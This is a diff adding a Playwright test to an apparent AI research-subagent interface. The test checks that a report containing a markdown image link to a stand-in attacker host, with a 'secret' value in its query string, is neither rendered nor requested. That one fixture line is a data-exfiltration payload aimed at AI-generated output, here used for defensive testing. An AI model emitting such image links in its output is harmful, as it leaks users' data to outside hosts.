@@ -231,6 +231,29 @@ test.describe("Subagent card", () => {
     );
   });
 
+  test("a report image is neither rendered nor requested", async ({ page }) => {
+    const requested: string[] = [];
+    await page.route("https://evil.example/**", (route) => {
+      requested.push(route.request().url());
+      return route.abort();
+    });
+    await mockApiRoutes(
+      page,
+      researchStream({
+        ...COMPLETED_RESULT,
+        report:
+          "Funding is 5M euro [doc:1 p.2]. ![x](https://evil.example/p.png?d=secret)",
+      }),
+    );
+    await sendMessage(page);
+
+    const report = page.getByTestId("subagent-report");
+    await expect(report).toContainText("Funding is 5M euro");
+    await expect(report.locator("img")).toHaveCount(0);
+    await page.waitForTimeout(500);
+    expect(requested).toEqual([]);
+  });
+
   test("a run that needs input shows the question", async ({ page }) => {
     await mockApiRoutes(page, researchStream(NEEDS_INPUT_RESULT));
     await sendMessage(page);
